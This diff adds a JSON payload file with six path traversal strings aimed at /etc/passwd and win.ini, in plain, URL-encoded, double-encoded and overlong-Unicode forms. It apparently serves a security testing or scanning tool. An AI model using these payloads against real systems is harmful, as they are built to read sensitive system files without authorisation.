@@ -1,0 +1,56 @@
+[
+  {
+    "id": "traversal_basic",
+    "name": "Basic Path Traversal",
+    "value": "../../../etc/passwd",
+    "type": "traversal",
+    "description": "Simple Unix path traversal",
+    "encoding": "none",
+    "tags": ["basic", "unix"]
+  },
+  {
+    "id": "traversal_double_encoding",
+    "name": "Double URL Encoding",
+    "value": "..%252f..%252f..%252fetc/passwd",
+    "type": "traversal",
+    "description": "Double URL-encoded path traversal",
+    "encoding": "url",
+    "tags": ["basic", "unix", "encoding"]
+  },
+  {
+    "id": "traversal_windows",
+    "name": "Windows Path Traversal",
+    "value": "..\\..\\..\\windows\\win.ini",
+    "type": "traversal",
+    "description": "Windows path traversal",
+    "encoding": "none",
+    "tags": ["basic", "windows"]
+  },
+  {
+    "id": "traversal_absolute_unix",
+    "name": "Absolute Path Unix",
+    "value": "/etc/passwd",
+    "type": "traversal",
+    "description": "Absolute Unix path",
+    "encoding": "none",
+    "tags": ["absolute", "unix"]
+  },
+  {
+    "id": "traversal_encoded_slash",
+    "name": "Encoded Slash",
+    "value": "..%2f..%2f..%2fetc/passwd",
+    "type": "traversal",
+    "description": "Path traversal with encoded slashes",
+    "encoding": "url",
+    "tags": ["encoding", "unix"]
+  },
+  {
+    "id": "traversal_unicode",
+    "name": "Unicode Path Traversal",
+    "value": "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "type": "traversal",
+    "description": "Unicode-encoded path traversal (older IIS)",
+    "encoding": "url",
+    "tags": ["unicode", "windows"]
+  }
+]
